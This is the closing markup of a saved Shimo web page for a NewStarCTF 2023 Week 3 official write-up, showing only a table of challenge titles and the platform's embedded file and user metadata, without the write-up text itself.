class="toc-entry heading-3 header-indent-undefined" data-index="15" data-offset="18007"><div class="dic-text">滴滴滴</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="16" data-offset="19238"><div class="dic-text">大怨种</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="17" data-offset="20438"><div class="dic-text">键盘侠</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="18" data-offset="22285"><div class="dic-text">2-分析</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="19" data-offset="24774"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Crypto</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="20" data-offset="24888"><div class="dic-text">Rabin's rsa</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="21" data-offset="25674"><div class="dic-text">knapsack</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="22" data-offset="26629"><div class="dic-text">Door</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="23" data-offset="27855"><div class="dic-text">babyrandom</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="24" data-offset="28651"><div class="dic-text">小明的密码题</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="25" data-offset="29318"><div class="dic-text">rsa_crt</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="26" data-offset="29855"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Reverse</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="27" data-offset="29919"><div class="dic-text">EzDLL</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="28" data-offset="32000"><div class="dic-text">STL</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="29" data-offset="33234"><div class="dic-text">Let's Go</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="30" data-offset="34683"><div class="dic-text">ez_chal</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="31" data-offset="36533"><div class="dic-text">Andronative</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="32" data-offset="38952"><div class="dic-text">花</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="33" data-offset="41523"><div class="dic-text">pyexe</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="34" data-offset="46442"><div class="dic-text">2hard2u</div></li></ul><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div></div></div></div></div></div>
                <div id="file-page-footer"><div class="sc-chPdSV gLVbAR"><span class="sc-kgoBCf kqIoIJ">二千八百四十<!-- --> &nbsp;阅<a class="sc-kGXeez liDUmU" href="https://shimo.im/docs/QPMRxzGktzsZnzhz/read#">举报</a></span></div><div class="sm-ad-wrapper pos-pc-readonly-doc-bottom" style="max-width: 816px; margin: 15px auto;"></div><div class="sm-ad-wrapper pos-pc-readonly-doc-bottom-2" style="max-width: 816px; margin: 15px auto;"></div></div>
            <div class="ql-demo-screen-back-to-top"></div></div>
        </div>
        <script>
          window.__SHIMO__ = {
            file: {"permissions":{"readable":true,"editable":false,"commentable":false,"manageable":false,"exitable":false,"exportable":true,"collaboratorManageable":false,"adminManageable":false,"outsiderAddable":false,"childFileCreatable":false,"shareModeManageable":false,"teamShareModeManageable":false,"copyable":true,"lockable":false,"unlockable":false,"removable":false,"downloadable":false,"canDuplicate":true,"canUncompress":false,"canPrint":true,"canSaveAsTemplate":true,"canApplyPermission":true,"canRename":false,"canModifyAdvancedPermission":false,"canCustomizeAdvancedPermission":false,"moveable":false,"sheetLockable":false,"passwordShareable":false,"fileAuthSetable":false},"url":"/docs/QPMRxzGktzsZnzhz","isDelete":0,"namePinyin":"n2wgfw|'newstarctf'2023'week3'guan'fang'writeup","parentId":5140742122,"passwordProtected":false,"shareCount":0,"shareMode":"readonly","teamId":null,"userId":28110366,"deletedBy":null,"updatedAt":"2023-10-23T16:14:42.000Z","updatedBy":28110366,"createdAt":"2023-08-31T09:40:38.000Z","id":5134285936,"guid":"QPMRxzGktzsZnzhz","name":"NewStarCTF 2023 Week3 官方WriteUp","name_pinyin":"n2wgfw|'newstarctf'2023'week3'guan'fang'writeup","password_protected":false,"share_mode":"readonly","type":"newdoc","is_delete":0,"user_id":28110366,"deleted_by":null,"updated_by":28110366,"team_id":null,"parent_id":5140742122,"created_at":"2023-08-31T09:40:38.000Z","updated_at":"2023-10-23T16:14:42.000Z","isFromSVC":false,"is_folder":0,"isFolder":false,"collaboratorCount":24,"departmentCollaboratorCount":0,"isSpace":false,"isLocked":false,"parentRole":"inherited","isShortcut":false,"isLegacy":true,"hasChildren":false,"isFileAdmin":false,"isCloudFile":false,"isDesktop":true,"fileSize":3823784,"user":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com","accountMetadata":{"isExpired":false,"isDingtalk":false,"isWework":false,"isEnterprise":false,"isFreeEnterprise":false,"expiredAt":{"seconds":1700807526,"nanos":0},"isTrial":false,"isPersonalPremium":true,"isEnterprisePremium":false,"isEnterpriseLight":false}},"updatedUser":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com"},"lockedUser":{},"Permissions":[{"id":null,"owner":false}],"permissionsAndReasons":{"canAddOutsider":{"value":false,"reason":"NOT_A_TEAM_FILE"},"canChangeShareMode":{"value":false,"reason":"UNKNOWN"},"canChangeTeamShareMode":{"value":false,"reason":"NOT_A_EDITOR"},"canComment":{"value":false,"reason":"UNKNOWN"},"canCopy":{"value":true,"reason":"UNKNOWN"},"canCreateChildFile":{"value":false,"reason":"UNKNOWN"},"canDownload":{"value":false,"reason":"NOT_A_DRIVE_FILE"},"canEdit":{"value":false,"reason":"UNKNOWN"},"canExit":{"value":false,"reason":"NOT_A_PERSONAL_COLLABORATOR"},"canExport":{"value":true,"reason":"UNKNOWN"},"canLock":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canManage":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canManageAdmin":{"value":false,"reason":"UNKNOWN"},"canManageCollaborator":{"value":false,"reason":"UNKNOWN"},"canRead":{"value":true,"reason":"UNKNOWN"},"canRemove":{"value":false,"reason":"CANT_MANAGE_FILE"},"canUnlock":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canUseMoveFeature":{"value":false,"reason":"CURRENT_ACCOUNT_VERSION_NOT_SUPPORT"},"canUsePasswordShareFileFeature":{"value":false,"reason":"CURRENT_ACCOUNT_VERSION_NOT_SUPPORT"},"canUseSheetLockFeature":{"value":false,"reason":"CURRENT_ACCOUNT_VERSION_NOT_SUPPORT"},"canDuplicate":{"value":true,"reason":"UNKNOWN"},"canUncompress":{"value":false,"reason":"NOT_A_COMPRESSED_FILE"},"canPrint":{"value":true,"reason":"UNKNOWN"},"canSaveAsTemplate":{"value":true,"reason":"UNKNOWN"},"canApplyPermission":{"value":true,"reason":"UNKNOWN"},"canRename":{"value":false,"reason":"UNKNOWN"},"canModifyAdvancedPermission":{"value":false,"reason":"NO_BASIC_PERMISSION"},"canCustomizeAdvancedPermission":{"value":false,"reason":"NO_BASIC_PERMISSION"}},"sortName":["NewStarCTF ",2023," Week",3," ","guān","fāng","WriteUp"],"starred":false,"tags":[],"marked":false,"share_count":0,"isImportPending":false,"views":2840},
            user: {},
            watermarkStatus: false
          }
        </script>
        <script>window.__INITIAL_STATE__={"users":{"mirror":{},"diff":{},"data":{},"persist":[]},"files":{"mirror":{},"diff":{},"data":{"QPMRxzGktzsZnzhz":{"id":5134285936,"guid":"QPMRxzGktzsZnzhz","name":"NewStarCTF 2023 Week3 官方WriteUp","type":"newdoc","fileSize":3823784,"user":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com","accountMetadata":{"isWework":false,"isEnterprise":false,"isEnterpriseLight":false,"isTrial":false,"isEnterprisePremium":false,"isPersonalPremium":true,"isDingtalk":false,"isFreeEnterprise":false,"expiredAt":{"seconds":1700807526,"nanos":0},"isExpired":false}},"updatedUser":{"id":28110366,"name":"ye","avatar":"https://uploader.shimo.im/f/8PTtzWubp0rDXnhn.PNG!avatar","email":"2245998470@qq.com"},"teamId":null,"parentId":5140742122,"shareMode":"readonly","createdAt":"2023-08-31T09:40:38.000Z","updatedAt":"2023-10-23T16:14:42.000Z","passwordProtected":false,"sortName":["NewStarCTF ",2023," Week",3," ","guān","fāng","WriteUp"],"isSpace":false,"isFromSVC":false,"isNew":false,"starred":false,"watched":false,"mute":false,"requirePassword":false,"collaboratorCount":24,"views":2840,"marked":false,"hasDesktopShortcut":false,"permissions":{"readable":true,"editable":false,"commentable":false,"manageable":false,"exitable":false,"collaboratorManageable":false,"outsiderAddable":false,"childFileCreatable":false,"shareModeManageable":false,"moveable":false},"contentUrl":"","creator":{}}},"persist":["QPMRxzGktzsZnzhz"]},"tree":{"mirror":{},"data":{}},"me":{"id":0,"stale":false},"recent":null,"starred":null,"deleted":null,"status":{"online":true,"physicalOnline":true,"pendingRequests":0,"dataLoaded":true,"pushClientId":"c1c216ad-d672-44d4-bdbb-2de08cf7d012"},"notifications":{"all":null,"unread":null,"allHasMore":true,"unreadHasMore":true,"unpeekedCount":0,"unreadCount":0},"collaborators":{"mirror":{},"data":{}},"teams":{"mirror":{},"diff":{},"data":{},"persist":[]},"teamMembers":null,"recentContacts":null,"updated":{"list":[]},"shared":{"list":[]},"unreadShared":null,"created":{"list":[]},"used":{"list":[]},"shortcuts":[],"userGuide":{},"wechat":{},"maintenance":{},"flashMessages":{},"alphaFeatures":{},"subscriptions":{"app_push_comment":true,"app_push_invitation":true,"app_push_team":true,"app_push_mention":true,"not_send_apn_when_web_online":true,"comment":true,"app_push_system":true,"desktop":true},"syncedFiles":{},"discussions":{},"templates":{},"settings":{},"blueTips":{},"bulletin":{},"spaces":{"size":null},"page":{"guid":"QPMRxzGktzsZnzhz"},"ui":{"templateModal":{"visible":false}}}</script>
<script async="" src="./NewStarCTF 2023 Week3 官方WriteUp_files/component-5ee51777e7.js.下载"></script>
<script async="" src="./NewStarCTF 2023 Week3 官方WriteUp_files/doc-1e4e43a9ca.js.下载"></script>
    

<div><div id="ToastsContainer_ShimoUI"><div class="Toastify"></div></div></div><div class="ql-bookmarker-container"><button type="button" class="ql-bookmarker"></button></div></body></html>